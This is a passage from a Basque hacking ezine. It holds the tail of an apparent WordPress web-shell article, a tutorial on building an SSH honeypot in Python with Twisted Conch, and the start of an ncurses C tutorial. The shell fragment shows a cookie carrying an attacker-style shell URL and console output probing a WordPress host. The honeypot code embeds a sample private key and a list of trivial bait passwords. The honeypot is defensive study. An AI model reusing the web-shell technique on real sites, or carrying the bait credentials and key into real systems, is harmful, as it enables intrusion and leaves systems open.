Set-Cookie: comment_author_url_9c7065c5618d551217189566c54a1f30=http%3A%2F%2Fbezerowp-shell.com%2F0; expires=Sun, 09 Jul 2006 03:36:10 GMT; path=/wordpress/


[Aginduen zain... ]
wp-shell> GET http://10.0.0.3/wordpress/?p=6 ...
wp-shell> Zerbitzariaren erantzuna:
[1[http://wp-shell.com/1]wp-shell katea bilatzen]

[Agindu berririk ez...]



Gaurkoz nahikoa...

die("beste bat arte");

					-Regexp Angelorum-

             -edit-
</0x02>




<0x03>


           Honeypot bat idazten Python-egaz: Ezagutu etsaia
          __________________________________________________



Orain dala gutxi hasi nintzan erasoak jasotzen nire etxean. Eraso hauek baziren
"Brute Force" erasoak SSH-ren kontra. Gaur egun nahiko normala da egoera hau 
baina arrunt ez dala bada log-eak begiratu eta zure izena topatu mila aldiz.


Egun horretan pentsatu neban zeozer egin behar nebala erasotzailea harrapatzeko.
Barrapunto-n idei on bat emon deustaten: Honeypot bat jartzea. Hartu neban 
konqueror, joan nintzan Google-ra eta bilatu neban "honeypot ssh". 
Ez zegoen ezebe. Beno, ez zegoen ezebe "merkea". Orduan egin neban betikoa: 

Topetan ez badot nik gure dodana nik egiten dot.


        Hasi baino lehen azaltzen gauza bat argi utzi nahi dot: 

               NIRE EUSKARA KALEKO EUSKARA DA. 
   NIK BIZKAIERA BERBA EGITEN DOT ETA BENETAN EZ DAKIDALA BATUA. 
           BARKATU NIRE EUSKARARENGATIK KALEKOA DALAKO.
 
                <edit: ez da barkamenik behar>


Zer dira honeypot-ak?
---------------------

Honeypot-ak badira software edo konputagailu batzuk haien intentzioa da erasotzaileak
erakartzea emuletan sistema eragile edo zerbitzu kalteberak. Bi honeypot mota dauz: 
elkarreragin txikikoa eta elkarreragin handikoak. Bigarrenak, normalean, badira sistema 
eragile errealak zabalik utzi direla ikasteko zer egiten daben erasotzaileek halako
sistemegaz. Lehenak (elkarreragin txikikoak) emulatzen dira zerbitzuak. Haien erabilera
mugatua da, noski, baina elkarreragin haundikoak baina seguruagoak dira.

Guk egingo doguna artikulo honetan izango da honeypot bat elkarreragin txikikoa,
emulatuko dogu SSH zerbitzu bat.


Python eta Twisted Conch Liburutegiak
-------------------------------------

Python languai libre, erraza eta potente bat da. Python-egaz programatuko dogu gure
SSH-ko honeypota. Twisted Conch liburutegiak SSH-ko implementazio libre bat da. 
SSH 2 protokoloa implementatzen dau. Twisted Conch liburutegiak, Python bezalaxe,
librea da (MIT lizentzia  erabiltzen dau) eta jaitsi daikegu 
http://twistedmatrix.com/ web orrialdetik.

Artikulu hau idazten ari nazenean, azken bertsioa 0.5.0 da. Jaitsi behar dogun
artxiboa bada:
http://tmrc.mit.edu/mirror/twisted/Conch/0.5/TwistedConch-0.5.0.tar.bz2.


Twisted Conch Adibideren bat: SSH zerbitzaria
---------------------------------------------

Twisted Conch liburutegiagaz adibide batzuk etortzen dira. Haietatik bat 
interesetan jaku:
SSH zerbitzaria. 

Gure adibidea 'sshsimpleserver.py' dau izena eta hurrengoa da 
adibidearen kodigoa:

----------------8<---------------------------------------------------------
#!/usr/bin/env python
from twisted.cred import portal, checkers
from twisted.conch import error, avatar
from twisted.conch.checkers import SSHPublicKeyDatabase
from twisted.conch.ssh import factory, userauth, connection, keys, session
from twisted.internet import reactor, protocol, defer
from twisted.python import log
from zope.interface import implements
import sys
log.startLogging(sys.stderr)

"""Example of running another protocol over an SSH channel.
log in with username "user" and password "password".
"""
class ExampleAvatar(avatar.ConchUser):
    def __init__(self, username):
        avatar.ConchUser.__init__(self)
        self.username = username
        self.channelLookup.update({'session':session.SSHSession})

class ExampleRealm:
    implements(portal.IRealm)
    def requestAvatar(self, avatarId, mind, *interfaces):
        return interfaces[0], ExampleAvatar(avatarId), lambda: None

class EchoProtocol(protocol.Protocol):
    """this is our example protocol that we will run over SSH
    """
    def dataReceived(self, data):
        if data == '\r':
            data = '\r\n'
        elif data == '\x03': #^C
            self.transport.loseConnection()
            return
        self.transport.write(data)

publicKey = 'ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAGEArzJx8OYOnJmzf4tfBEvLi8DVPrJ3/c9k2I/Az64fxjHf9imyRJbixtQhlH9lfNjUIx+4LmrJH5QNRsFporcHDKOTwTTYLh5KmRpslkYHRivcJSkbh/C+BR3utDS555mV'

privateKey = """-----BEGIN RSA PRIVATE KEY-----
MIIByAIBAAJhAK8ycfDmDpyZs3+LXwRLy4vA1T6yd/3PZNiPwM+uH8Yx3/YpskSW
4sbUIZR/ZXzY1CMfuC5qyR+UDUbBaaK3Bwyjk8E02C4eSpkabJZGB0Yr3CUpG4fw
vgUd7rQ0ueeZlQIBIwJgbh+1VZfr7WftK5lu7MHtqE1S1vPWZQYE3+VUn8yJADyb
Z4fsZaCrzW9lkIqXkE3GIY+ojdhZhkO1gbG0118sIgphwSWKRxK0mvh6ERxKqIt1
xJEJO74EykXZV4oNJ8sjAjEA3J9r2ZghVhGN6V8DnQrTk24Td0E8hU8AcP0FVP+8
PQm/g/aXf2QQkQT+omdHVEJrAjEAy0pL0EBH6EVS98evDCBtQw22OZT52qXlAwZ2
gyTriKFVoqjeEjt3SZKKqXHSApP/AjBLpF99zcJJZRq2abgYlf9lv1chkrWqDHUu
DZttmYJeEfiFBBavVYIF1dOlZT0G8jMCMBc7sOSZodFnAiryP+Qg9otSBjJ3bQML
pSTqy7c3a2AScC/YyOwkDaICHnnD3XyjMwIxALRzl0tQEKMXs6hH8ToUdlLROCrP
EhQ0wahUTCk1gKA4uPD6TMTChavbh4K63OvbKg==
-----END RSA PRIVATE KEY-----"""


class InMemoryPublicKeyChecker(SSHPublicKeyDatabase):
    def checkKey(self, credentials):
        return credentials.username == 'user' and \
            keys.getPublicKeyString(data=publicKey) == credentials.blob

class ExampleSession: 
    def __init__(self, avatar):
        """
        We don't use it, but the adapter is passed the avatar as its first
        argument.
        """

    def getPty(self, term, windowSize, attrs):
        pass
    
    def execCommand(self, proto, cmd):
        raise Exception("no executing commands")

    def openShell(self, trans):
        ep = EchoProtocol()
        ep.makeConnection(trans)
        trans.makeConnection(session.wrapProtocol(ep))

    def eofReceived(self):
        pass

    def closed(self):
        pass

from twisted.python import components
components.registerAdapter(ExampleSession, ExampleAvatar, session.ISession)

class ExampleFactory(factory.SSHFactory):
    publicKeys = {
        'ssh-rsa': keys.getPublicKeyString(data=publicKey)
    }
    privateKeys = {
        'ssh-rsa': keys.getPrivateKeyObject(data=privateKey)
    }
    services = {
        'ssh-userauth': userauth.SSHUserAuthServer,
        'ssh-connection': connection.SSHConnection
    }
    

portal = portal.Portal(ExampleRealm())
passwdDB = checkers.InMemoryUsernamePasswordDatabaseDontUse()
passwdDB.addUser('user', 'password')
portal.registerChecker(passwdDB)
portal.registerChecker(InMemoryPublicKeyChecker())
ExampleFactory.portal = portal

if __name__ == '__main__':
    reactor.listenTCP(5022, ExampleFactory())
    reactor.run()
----------------8<---------------------------------------------------------


Adibide hau gordeko dogu fitxategi batean, eta jarriko dogu 'jakin_honeypot.py' izena.


Zer aldatu behar dogu orain?
----------------------------

Hasi baino lehen aldatzen kodigoa jakin behar dogu zertarako balio dabe 2 klaseak
  behintzat:

 1.class EchoProtocol(protocol.Protocol): Hauxe izango da gure 'protokoloa'.
 Hemen jasoko doguz bidalitako komandoak eta bidaliko doguz gure erantzunak.

 2.class ExampleSession: Klase honegaz gestionatuko dogu erasotzaileek irekitzen
 dabezan sesioak.

Orain jakin behar dogu non egiten dan autentikazioa eta zelan. Azken lerroetan 
aurkitzen dogu textu hau:

 passwdDB = checkers.InMemoryUsernamePasswordDatabaseDontUse()
 passwdDB.addUser('user', 'password')

Lerro hauetan erregistretan dau pasahitzaren datubase bat memorian gordeko dala.
Gauza bat: honeypot bat ez balitz izango, EZ GENDUAN ERABILI BEHARKO MODU HAUXE
OSO INSEGURUA DALAKO. Datubase honetan erabiltzaile bat sartzen dau:
erabiltzaile 'user' 'password' pasahitzagaz. Guk hemen jarri daikegu nahi doguzan
erabiltzaileak. 

Gogoratu behar dogu guk gure doguna da erasotzaileak sartzen direla, orduan, jarri
behar doguz konta arruntak pasahitz errazegaz, adibidez: root/root, ftp/ftp, web/web,
admin/admin, etab... Idatz daikegu hor berton lerro batzuk, aldatzen 'user' guk 
nahi dogun erabiltzailegaz eta 'password' guk nahi dogun pasahitzagaz baina hau 
ez jata bapest gustetan (neri behintzat). Beste Python-eko modulo bat egingo dogu
erabiltzaileak erregistratzeko. Horrexetarako joan behar dogu lehen lerroetara
(hamargarren lerrora) eta sartuko dogu hurrengo kodigoa:

01	#!/usr/bin/env python
02	from twisted.cred import portal, checkers
03	from twisted.conch import error, avatar
04 	from twisted.conch.checkers import SSHPublicKeyDatabase
05	from twisted.conch.ssh import factory, userauth, connection, keys, session
06	from twisted.internet import reactor, protocol, defer
07	from twisted.python import log
08	from zope.interface import implements
09	import sys
10
11	from honey_userdb import *
12
13	log.startLogging(sys.stderr)

Gorrian dauzen lerroak sartu behar doguzenak dira. Orain sortu behar dogu modulu
berri bat 'honey_userdb.py' dauela izena. Modulu honetan hurrengo kodigoa sartuko dogu:

FAKE_USERS_FILE = '/home/joxean/fakeusers'

def add_users(passwdDB):
    file = open(FAKE_USERS_FILE, "r")

    i = 0
    for line in file:
        i += 1
        data = line.split(' ')
        try:
            passwdDB.addUser(data[0], data[1].rstrip())
        except:
            print "Error in fake users file at line " + str(i)
            print sys.exc_info()[1]
            

Modulo honek 'add_users' funtsio bat deko. Funtsio honek irakurtzen dau fitxategi
bat. Fitxategi honetan (FAKE_USERS_FILE aldagaia) edukiko dauz guk sartu gure 
doguzan erabiltze eta pasahitzako pareak. 
Nire kasoan sortu dot /home/joxean/fakeusers eta hauxe da nire fitxategiaren edukiera:

oracle oracle
web web
admin admin
ftp ftp
ftpadmin ftpadmin
web web
webadmin webadmin
test test
guest guest
user user
root root
mysql mysql
webmaster webmaster
linux linux
unix unix
bsd bsd
administrator administrator
fake fake

Berriro aldatu behar dogu ' jakin_honeypot.py' fitxategia. Hurrengo kodigoa sartuko dogu: 

 portal = portal.Portal(ExampleRealm())
 passwdDB = checkers.InMemoryUsernamePasswordDatabaseDontUse()

 add_users(passwdDB) # Orain erregistratzen doguz gure fitxategian dauzen erabiltzaileak

 portal.registerChecker(passwdDB)
 portal.registerChecker(InMemoryPublicKeyChecker())
 ExampleFactory.portal = portal

Berriro bere, gorrian daun lerroa berria da. Lerro honek add_users funtsioa deitzen
dau, honey_userdb.py fitxategian dagoela.



Gure 'protokoloa' idazten
-------------------------

Orain aldatuko dogu EchoProtocol klasea. Jasotzen dogunean textoa beste modulo 
batera pasatuko dogu, eta modulu horretan prozesatuko dogu eskaerak. Hori izango
da gure benetazko protokoloa. Gure klasea horrela geratu behar da:

----------------8<---------------------------------------------------------
class EchoProtocol(protocol.Protocol):
    """
    Hauxe da gure 'benetazko' protokoloa }:->
    """
    lastCmd = ""

    def connectionMade(self):
        print self.transport
        self.transport.write('Wellcome to ' + str(FAKE_OS) + '!\r\n\r\n' + str(FAKE_PROMPT))

    def dataReceived(self, data):
        global FAKE_PROMPT

        if data == '\r':
            retvalue = processCmd(self.lastCmd, self.transport)
            self.lastCmd = ""
            data = '\r\n' + str(FAKE_PROMPT) 
        elif data == '\x03': #^C
            try:
                self.transport.loseConnection()
            finally:
                return
        else:
            self.lastCmd += data

        self.transport.write(data)
----------------8<---------------------------------------------------------

Zer aldatu dogu klase honetan? 
Lehena, connectionMade metodoa sartu dogu. Erasotzaileak lotzen dan bezain laster
hor dekogun kodigoa exekutatuko da. Guk erakutsiko dogu gure 'sistema eragilearen
bertsioa':

self.transport.write('Wellcome to ' + str(FAKE_OS) + '!\r\n\r\n' + str(FAKE_PROMPT))
	

FAKE_OS eta FAKE_PROMPT aldagaiak definitu behar doguz. Proposito honexetarako 
beste modulu bat sortuko dogu. 'honey_identity.py' izena jarriko dogu eta hurrengo
textua sartuko dogu:


FAKE_USER_CHAR = "$"
FAKE_OS = "OpenBSD bigturd 2.5 GENERIC#172 sparc"
FAKE_SHELL = "bash-2.0"
FAKE_PROMPT = "bash-2.0" + str(FAKE_USER_CHAR) + " "
FAKE_USER = "admin"
FAKE_W = ("USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT",
": Permission denied"
)
FAKE_LS = ("drwxr-xr-x    2 root root   4096 2005-06-06 07:00 bin",
"drwxr-xr-x    3 root root   4096 2005-06-25 16:13 boot",
"drwxr-xr-x   10 root root  14320 2005-07-10 22:19 dev",
"drwxr-xr-x  100 root root   4096 2005-07-11 20:31 etc",
"drwxr-xr-x   10 root root   8192 2005-07-10 01:33 lib",
"drwxr-xr-x    2 root root  49152 2005-05-14 18:47 lost+found",
"drwxr-xr-x    3 root root   4096 2005-07-06 23:11 opt",
"drwxr-xr-x    3 root root   4096 2005-07-06 04:30 oracle",
"drwxr-xr-x    3 root root   4096 2005-07-06 01:51 personal",
"drwxr-xr-x    3 root root   4096 2005-07-06 22:41 pr0n",
"drwxr-xr-x    3 root root   4096 2005-07-06 23:44 private",
"drwxr-xr-x    2 root root   4096 2005-07-10 01:33 sbin",
"drwxr-xr-x    3 root root   4096 2005-07-06 23:11 secure_firewall_ltd",
"drwxr-xr-x    2 root root   4096 2005-05-14 18:49 srv",
"drwxr-xr-x   10 root root      0 2005-07-11 00:08 sys",
"drwxrwxrwt   11 root root   4096 2005-07-11 21:17 tmp",
"drwxr-xr-x   14 root root   4096 2005-07-10 15:52 usr",
"drwxr-xr-x   14 root root   4096 2005-06-06 07:02 var",
"drwxr-xr-x   14 root root   4096 2005-06-06 07:02 videos",
"lrwxrwxrwx    1 root root     25 2005-06-25 16:13 vmunix -> boot/vmunix-2.5-172"
)
FAKE_RM = "rm: Permission denied"
FAKE_TOUCH = "touch: Permission denied"
FAKE_DENIED = "Permission denied"


Berriro aldatu behar dogu 'jakin_honeypot.py' fitxategia, 'honey_identity.py' 
fitxategira erreferentzia egiteko:


09	import sys
10
11	from honey_userdb import *
12	from honey_identity import *
13
14	log.startLogging(sys.stderr)



Honeypot-a Amaitzen (Bazan garaia...)
-------------------------------------

Azken gauza faltetan jaku: eta processCmd funtsioa non utzi dogu? EchoProtocol
klasean sartu dogu dei bat processCmd funtsiora baina ondiÃ±o ez dogu inplementatu
funtsio hori. Berriro bere, beste modulu bat sortuko dogu (azkena da, benetan), 
'honey_commands.py' daulea izena eta hurrengoa izango da haren kodigoa: 


import re # Expresio erregularrak erabiltzeko
from honey_identity import * # Gure identitatea }:->

uname_re = re.compile("uname(\ )*.*")
ls_re = re.compile("ls(\ )*.*")
su_re = re.compile("su(\ )*.*")
passwd_re = re.compile("passwd(\ )*.*")

def processCmd(data, transport):

    global FAKE_SHELL, con

    print "COMMAND IS : " + data
    transport.write('\r\n')

    if uname_re.match(data):
        transport.write(FAKE_OS)
    elif ls_re.match(data):
        for line in FAKE_LS:
            transport.write(line + '\r\n')
    elif data == "exit":
        transport.loseConnection()
    elif data == "w":
        for line in FAKE_W:
            transport.write(line + '\r\n')
    elif data == "who":
        transport.write(FAKE_USER)
    elif su_re.match(data):
        pass
    elif data == "":
        pass
    elif passwd_re.match(data):
        transport.write('geteuid: _getuid: Invalid operation')
    else:
        transport.write(FAKE_SHELL + ": " + str(data) + ": command not found")

Hona hemen prozesetan doguz jasotako komandoak. Momentuz 'ls', 'uname', 'su', 'passwd',  'w', 'who' eta 'exit' komandoak baino ez doguz erabiltzen. Expresio erregularraren bidez analizetan doguz bidalitako komandoak eta 'ls', 'uname', 'su' edo 'passwd' antzekoak badira guk nahi dogun erantzuna bidaltzen dogu. Adibidez, 'ls' antzeko komando bat jasotzen badogu hurrengo kodigoa exekutatuko da: 

    elif ls_re.match(data): # ls antzeko komandu bat bada

	# Irakurtzen dogu FAKE_LS aldagaia, honey_identity.py fitxategian dagoela
        for line in FAKE_LS:
            transport.write(line + '\r\n')



Hasiko gaitekez jolasten?
-------------------------

Amaitu dogu gure honeypot txikia. Orain hasi gaitekez jolasten. Lehen exekutatuko
dogu gure honeypot-a terminal batean. 5022 TCP-ko portuan entzungo dau. Aldatu 
nahi badogu hau, adibidez 22 TCP-ko portuan entzuteko aldatu behar dogu 
'jakin_honeypot.py' fitxategian azken lerroak: 

 if __name__ == '__main__':
     reactor.listenTCP(5022, ExampleFactory())
     reactor.run()

Portu hori ez badogu nahi aldatzen dogu eta kitto. Adibidez, gure kasuan jarriko
dogu 22, SSH-ko portu estandarra dala:

 if __name__ == '__main__':
     reactor.listenTCP(22, ExampleFactory())
     reactor.run()


Exekutatu baino lehen gelditu behar dogu OpenSSH zerbitzaria jarrita baldin 
badekogu. Adibidez, nik Debian distribuzio batean exekutatuko dot hurrengo komandoa:

/etc/init.d/ssh stop


Eta orain (root erabiltzaile bezalaxe) exekutatuko dogu gure honeypot-a:

# python jakin_honey.py
2005/07/17 14:34 CEST [-] Log opened.
2005/07/17 14:34 CEST [-] __main__.ExampleFactory starting on 22
2005/07/17 14:34 CEST [-] Starting factory <__main__.ExampleFactory instance at 0xb799176c>


Beste terminal batetik SSH exekutatuko dogu:


$ ssh admin@localhost
admin@localhost's password:
Wellcome to OpenBSD bigturd 2.5 GENERIC#172 sparc!

bash-2.0$ ls
drwxr-xr-x    2 root root   4096 2005-06-06 07:00 bin
drwxr-xr-x    3 root root   4096 2005-06-25 16:13 boot
drwxr-xr-x   10 root root  14320 2005-07-10 22:19 dev
drwxr-xr-x  100 root root   4096 2005-07-11 20:31 etc
drwxr-xr-x   10 root root   8192 2005-07-10 01:33 lib
drwxr-xr-x    2 root root  49152 2005-05-14 18:47 lost+found
drwxr-xr-x    3 root root   4096 2005-07-06 23:11 opt
drwxr-xr-x    3 root root   4096 2005-07-06 04:30 oracle
drwxr-xr-x    3 root root   4096 2005-07-06 01:51 personal
drwxr-xr-x    3 root root   4096 2005-07-06 22:41 pr0n
drwxr-xr-x    3 root root   4096 2005-07-06 23:44 private
drwxr-xr-x    2 root root   4096 2005-07-10 01:33 sbin
drwxr-xr-x    3 root root   4096 2005-07-06 23:11 secure_firewall_ltd
drwxr-xr-x    2 root root   4096 2005-05-14 18:49 srv
drwxr-xr-x   10 root root      0 2005-07-11 00:08 sys
drwxrwxrwt   11 root root   4096 2005-07-11 21:17 tmp
drwxr-xr-x   14 root root   4096 2005-07-10 15:52 usr
drwxr-xr-x   14 root root   4096 2005-06-06 07:02 var
drwxr-xr-x   14 root root   4096 2005-06-06 07:02 videos
lrwxrwxrwx    1 root root     25 2005-06-25 16:13 vmunix -> boot/vmunix-2.5-172
bash-2.0$ uname
OpenBSD bigturd 2.5 GENERIC#172 sparc
bash-2.0$ exit
Connection to localhost closed.


Lehen terminalean hurrengo textua topatuko dogu:

2005/07/17 14:34 CEST [-] Log opened.
2005/07/17 14:34 CEST [-] __main__.ExampleFactory starting on 22
2005/07/17 14:34 CEST [-] Starting factory <__main__.ExampleFactory instance at 0xb799176c>
2005/07/17 14:35 CEST [SSHServerTransport,0,127.0.0.1] kex alg, key alg: diffie-hellman-group1-sha1 ssh-rsa
2005/07/17 14:35 CEST [SSHServerTransport,0,127.0.0.1] server->client: aes128-cbc hmac-md5 none
2005/07/17 14:35 CEST [SSHServerTransport,0,127.0.0.1] client->server: aes128-cbc hmac-md5 none
2005/07/17 14:35 CEST [SSHServerTransport,0,127.0.0.1] starting service ssh-userauth
2005/07/17 14:35 CEST [SSHService ssh-userauth on SSHServerTransport,0,127.0.0.1] admin trying auth none
2005/07/17 14:35 CEST [SSHService ssh-userauth on SSHServerTransport,0,127.0.0.1] admin trying auth publickey
2005/07/17 14:35 CEST [SSHService ssh-userauth on SSHServerTransport,0,127.0.0.1] admin failed auth publickey
2005/07/17 14:35 CEST [SSHService ssh-userauth on SSHServerTransport,0,127.0.0.1] reason:
2005/07/17 14:35 CEST [SSHService ssh-userauth on SSHServerTransport,0,127.0.0.1] Traceback (most recent call last):
2005/07/17 14:35 CEST [SSHService ssh-userauth on SSHServerTransport,0,127.0.0.1] Failure: twisted.cred.error.UnauthorizedLogin:
2005/07/17 14:35 CEST [SSHService ssh-userauth on SSHServerTransport,0,127.0.0.1] None
2005/07/17 14:35 CEST [SSHService ssh-userauth on SSHServerTransport,0,127.0.0.1] admin trying auth password
2005/07/17 14:35 CEST [SSHService ssh-userauth on SSHServerTransport,0,127.0.0.1] admin authenticated with password
2005/07/17 14:35 CEST [SSHService ssh-userauth on SSHServerTransport,0,127.0.0.1] starting service ssh-connection
2005/07/17 14:35 CEST [SSHService ssh-connection on SSHServerTransport,0,127.0.0.1] got channel session request
2005/07/17 14:35 CEST [SSHChannel session (0) on SSHService ssh-connection on SSHServerTransport,0,127.0.0.1] channel open
2005/07/17 14:35 CEST [SSHChannel session (0) on SSHService ssh-connection on SSHServerTransport,0,127.0.0.1] pty request: xterm (22L, 116L, 0L, 0L)
2005/07/17 14:35 CEST [SSHChannel session (0) on SSHService ssh-connection on SSHServerTransport,0,127.0.0.1] getting shell
2005/07/17 14:35 CEST [SSHChannel session (0) on SSHService ssh-connection on SSHServerTransport,0,127.0.0.1] <twisted.conch.ssh.session.SSHSessionProcessProtocol instance at 0xb7991d6c>
2005/07/17 14:35 CEST [SSHChannel session (0) on SSHService ssh-connection on SSHServerTransport,0,127.0.0.1] <twisted.conch.ssh.session.SSHSessionProcessProtocol instance at 0xb7991d6c>
2005/07/17 14:35 CEST [SSHChannel session (0) on SSHService ssh-connection on SSHServerTransport,0,127.0.0.1] <twisted.conch.ssh.session.SSHSessionProcessProtocol instance at 0xb7991d6c>
2005/07/17 14:36 CEST [SSHChannel session (0) on SSHService ssh-connection on SSHServerTransport,0,127.0.0.1] COMMAND IS : ls
2005/07/17 14:36 CEST [SSHChannel session (0) on SSHService ssh-connection on SSHServerTransport,0,127.0.0.1] COMMAND IS : uname
2005/07/17 14:36 CEST [SSHChannel session (0) on SSHService ssh-connection on SSHServerTransport,0,127.0.0.1] COMMAND IS : exit
2005/07/17 14:36 CEST [SSHChannel session (0) on SSHService ssh-connection on SSHServerTransport,0,127.0.0.1] sending close 0
2005/07/17 14:36 CEST [SSHChannel session (0) on SSHService ssh-connection on SSHServerTransport,0,127.0.0.1] remote close
2005/07/17 14:36 CEST [SSHServerTransport,0,127.0.0.1] connection lost



Zer faltetan jako gure honeypot-ari?
------------------------------------

Orain jasotzen dogun argipide guztia STDOUT edo STDERR dispositiboetan idazten 
dau gure honeypotak, hobeto izango zan fitxategi batean utzi daidala. Ba azaken
aldaketa nahiko erraza da. 'jakin_honeypot.py' fitxategian aldatu 15-garren lerroa:

09	import sys
10
11	from honey_userdb import *
12	from honey_identity import *
13
14	log.startLogging(sys.stderr)
15	log.startLogging(open(â/var/log/jakin_honeypot.logâ, âaâ))


Eta orain?
----------

Ba orain, experimentatu nahi badozue, jarri gutxienez aste bat honeypot hauxe 
internetean. Nire experimentoan izan dodaz 1824 erasotzeko saiaketak aste batean.
Etorri ziran Suiza-tik, EE.BB.-etatik, Espaina-tik, Erromaniatik, Korea-tik, 
Brasil-etik, etab... Ea-ea estatu guztietatik... Jarri eta dibertitu :)

OHARRA: Estatu batzuetan ilegala izan daiteke honeypotak jartzea. Ilegalak ez 
izateko kalteberak izan behar dira eta apurtu behar dabez erasotzaileek, orduen,
tentuz ibili, ea zertarako erabiltzen dogun! Beste zera bat: Honeypotak jasotzen
dauen argipidea ez dau balio, adibidez, epaiketa batean. Beno, balio dabe, baina
epaitegi batek agintzen badau jarri behar dala.


Erreferentziak
--------------

Honeypots, Intrusion Detection, Incident Response
Project Honey Pot: Distributed Spam Harvester Tracking Network 
Thp - Tiny Honeypot 
Honeyd - Network Rhapsody for You
Honeypot Wikipedian
"Know Your Enemy: Everything you need to know about honeypots"
SANS Institute: What is a Honey Pot?
Open Directory Project-Honeypots and Honeynets
Twisted Conch

Euskal Herria, 2005-ko Uztaialaren 17-xe
Joxean Koret

</0x03>




<0x04>
                   Unix programazioa: Ncurses adibideak
                 _______________________________________

Kaixo lagunok!
Gaurkoan Unix-ekin jarraituko dugu baina prozesuak, hariak eta guzti hori alde batera
utzita curses liburutegiarekin jolastuko dugu. Curses liburutegiarekin kontsola interfaze
dotoreak sortzeko aukera daukagu, iptraf, top, kismet estiloko kontsola-interfazeak
bezalaxe.
Curses liburutegiarekin leihoak, menuak, formularioak eta horien konbinazioak sor 
daitezke, nahi dugun koloreekin (oinarrizko koloreekin). 

Aproposa al da artikulu hau?
Duela gutxi SET#31 atera da eta ncurses-i buruzko erreferentzia artikulua dakar;
baina artikulu horretan ez dago kode adibiderik. Hartaz artikulu hau SET-enaren
osagarri bikaina da. Tira:

Lehen programa
--------------

Klasiko bat: "kaixo mundua" baina curses erabiliz.

----------------8<-------------------------------------------------------------
/**
* $Id$
* kaixo_curses.c
* curses programa xinplea - Espoz&Mina - Jakin ezine 7
* kopilazioa:
* gcc -o kaixo_curses -lcurses kaixo_curses.c
*/

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <curses.h>

int main () {

	// Hasieraketa terminal bakar batekin
	if (initscr() == NULL) {
            printf("Errorea hasieraketan: %s",strerror(errno));    
            exit(EXIT_FAILURE);
	}

        // Mezu bat pantailaratzen dugu
        printw("Kaixo curses");

        // Zerbait egin bada refresh bitartez ikusiko dugu
        refresh();
        // pixka bat egon...
        sleep(2);
        
        // Eta bukatzen dugu.
        endwin();

        printf("\nBerriz terminal arruntan gaude\n");

        return(EXIT_SUCCESS);
}

--------------8<---------------------------------------------------------------


Aitzineko kasu horretan nolabait leiho bakarra dago, terminala hain zuzen.
Modu ezberdin batean joka daiteke curses interfaze konplexuagoak garatzeko.
Hortxe oinarrizko adibidea:

----------------8<-------------------------------------------------------------
/**
* $Id$
* kaixo_curses_multi.c
* curses programa xinplea screen erabiliz - Espoz&Mina - Jakin ezine 7
* kopilazioa:
* gcc -o kaixo_curses_multi -lcurses kaixo_curses_multi.c
*/

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <curses.h>

int main (void) {

        // Kasu honetan terminal bat baino gehiago
        // egon daiteke. Bat definituko dugu.
        SCREEN *pantaila;

	// Hasieraketa terminal bakar batekin
	if ((pantaila = newterm(NULL, stdout, stdin)) == NULL) {
            printf("Errorea hasieraketan: %s",strerror(errno));    
            exit(EXIT_FAILURE);
	}

	// Momentuko terminala ezartzen dugu: pantaila aldagaia
	if (set_term(pantaila) == NULL) {
            printf("Errorea pantaila ezartzerakoan: %s\n",strerror(errno));    

            // Bi dei hauekin terminal egoerara itzuliko gara
            // Kasu hauetan beti erabili behar dira bi dei hauek.
            endwin();
            delscreen(pantaila); // memoria askatuko da.

            exit(EXIT_FAILURE);
	}

        // Mezu bat pantailaratzen dugu
	move(12,35);
	printw("Hauxe curses leihoa da");
	refresh();

        // pixka bat egon...
        sleep(2);
        
        // Eta bukatzen dugu.
        endwin();
        delscreen(pantaila); // memoria askatuko da.

        printf("\nBerriz terminal arruntan gaude\n");

        return(EXIT_SUCCESS);
}


--------------8<---------------------------------------------------------------


OK. Ingurune bisualetan (VB, java, e.a.) gertaerei bideratutako programazioa egiten da.
Hots, "on_mouse_click" estiloko funtzioak definitu behar dira erabiltzaileak egiten
duena kontrolatzeko. Curses-en kasuan normalean interfazea aurkezten da eta horren ondoren
programa sarreraren zain geratzen da.

Sasikodean holako zerbait litzateke:

...

while ( (kar = hartu_karak)) {
 
   swtich (kar)
      case 'q' : atera;
      case 'gora' : mugitu_gora;
      case 'behera' : mugitu_behera;
      default : break;
   }
}

...


Curses ingurunean xaguaren kontrola har daiteke. Dena den hori beste egun baterako utziko
dugu.



Menuak
------

Menuak sortzeko lehenbizi menuaren elementua definitu behar dira, ondoren elementu
multzo hori menu bati esleitzen zaizkio eta kitto.
Kasu honetan menuak eta leihoak ikusiko ditugu adibide honetan:

------------8<-----------------------------------------------------------------
/**
* $Id$
* menuak.c
* curses proba menuak ikusteko - Espoz&Mina - Jakin ezine 7
* Konpilatzeko:
* gcc -o menuak -lcurses -lmenu menuak.c
*/

#include <stdlib.h>
#include <unistd.h>
#include <curses.h>
#include <menu.h>
#include <ctype.h>
#include <errno.h>

int main (int argc, char *argv[]) {

	// pantaila
	SCREEN *scr;
	WINDOW *leihoa, *izenburu_leihoa;
	char str[20];
	char *titulua = "Curses probak - Jakin ezine 7";

	/** MENUAK **/
	char *MENUA[] = {"Inferno", "inferno",
			"Plan9", "plan9",
                        "OpenBSD","openbsd",
                        "NetBSD","netbsd",
			"Mandriva", "mandriva", 
			"Irten", "irten",NULL};	

	MENU *menu;
	ITEM *items[6];

	int quit = 0, key, i;
	
	/** Curses hasieraketa **/
	if ( (leihoa = initscr()) == NULL) {
		perror("Errorea ncurses hasieratzerakoan");	
		exit(EXIT_FAILURE);
	}

	/** curses hasieraketa prest **/

	box(leihoa,ACS_VLINE,ACS_HLINE);

	// Koloreak!!
	if (has_colors()) {
		if ((start_color()) == ERR) {
			perror("Kolore hasieraketan errorea");
			exit(EXIT_FAILURE);
		}

		move(1,1);
		printw("Dena ongi doa");
		refresh();
		init_pair(COLOR_BLACK, COLOR_BLACK,COLOR_BLACK);
		init_pair(COLOR_GREEN, COLOR_GREEN, COLOR_BLACK);
		init_pair(COLOR_RED, COLOR_RED, COLOR_BLACK);
		init_pair(COLOR_CYAN, COLOR_CYAN, COLOR_BLACK);
		init_pair(COLOR_YELLOW, COLOR_YELLOW,COLOR_BLACK);
		bkgd(A_REVERSE | COLOR_PAIR(COLOR_GREEN));
		refresh();
	}
	
	// Izenburu leihoa
	if ( (izenburu_leihoa = newwin(11,45,11,45)) == NULL) {
		perror("Errorea izenburu_leihoa leihoa ateratzerakoan");
		exit(EXIT_FAILURE);
	}

        // atzekaldeko kolorea ezartzen da
